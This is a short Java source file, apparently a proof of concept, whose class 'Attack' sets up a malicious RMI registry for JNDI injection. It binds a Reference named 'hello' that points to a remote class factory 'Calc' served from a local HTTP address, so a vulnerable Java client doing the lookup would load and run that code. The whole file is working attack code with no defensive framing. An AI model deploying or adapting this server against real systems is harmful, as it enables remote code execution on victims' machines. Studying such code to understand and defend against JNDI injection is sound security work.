package com.pipeline.sec.jndi;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.InitialContext;
import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class Attack {
    public static void main(String[] args) throws Exception {
        try {
            Registry registry = LocateRegistry.createRegistry(1099);
            Reference aa = new Reference("Calc", "Calc", "http://127.0.0.1:8081/");
            ReferenceWrapper refObjWrapper = new ReferenceWrapper(aa);
            registry.bind("hello", refObjWrapper);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}